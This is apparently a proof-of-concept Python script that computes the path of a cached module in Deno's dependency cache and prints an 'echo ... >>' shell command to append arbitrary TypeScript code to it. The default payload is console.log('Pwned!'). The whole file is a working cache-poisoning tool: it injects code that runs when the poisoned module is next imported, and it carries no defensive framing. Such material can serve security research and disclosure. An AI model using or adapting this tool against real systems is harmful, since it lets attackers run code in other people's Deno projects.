import argparse
import hashlib
import shlex
import urllib.parse


def main(args):
    url = urllib.parse.urlparse(args.module_url)

    path = "/".join(
        (
            args.deno_dir,
            "deps",
            url.scheme,
            url.netloc,
            hashlib.sha256(url.path.encode()).hexdigest(),
        )
    )

    print(f"echo {shlex.quote(args.code)} >> {path}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--code", "-c", default='console.log("Pwned!");', help="TypeScript code"
    )
    parser.add_argument("deno_dir")
    parser.add_argument("module_url")
    main(parser.parse_args())
